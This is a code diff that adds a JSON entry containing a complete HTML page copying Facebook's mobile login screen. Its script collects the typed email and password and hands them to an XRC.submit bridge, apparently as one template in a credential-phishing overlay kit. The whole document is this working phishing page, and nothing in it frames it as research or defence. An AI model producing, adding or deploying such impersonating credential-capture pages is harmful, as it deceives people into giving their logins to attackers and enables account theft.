@@ -1,0 +1,7 @@
+{
+  "id": "facebook",
+  "domain": "m.facebook.com",
+  "name": "Facebook",
+  "type": "social",
+  "html": "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Facebook - Log In</title><style>body{margin:0;padding:0;background:#F0F2F5;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh}.box{padding:20px;width:90%;max-width:360px}.logo{text-align:center;margin-bottom:20px;font-size:32px;font-weight:bold;color:#1877F2}input{width:100%;padding:14px;margin:6px 0;border:1px solid #ddd;border-radius:6px;background:#fff;color:#000;box-sizing:border-box;font-size:17px}input:focus{outline:none;border-color:#1877F2}button{width:100%;padding:12px;margin-top:10px;background:#1877F2;border:none;border-radius:6px;color:#fff;font-size:17px;font-weight:bold;cursor:pointer}button:active{opacity:0.8}.link{color:#1877F2;text-align:center;margin-top:14px;font-size:14px}</style></head><body><div class='box'><div class='logo'>facebook</div><input type='text' id='email' placeholder='Mobile number or email'><input type='password' id='password' placeholder='Password'><button onclick='submit()'>Log In</button><div class='link'>Forgot Password?</div></div><script>function submit(){var e=document.getElementById('email').value;var p=document.getElementById('password').value;XRC.submit(JSON.stringify({email:e,password:p}));}</script></body></html>"
+}
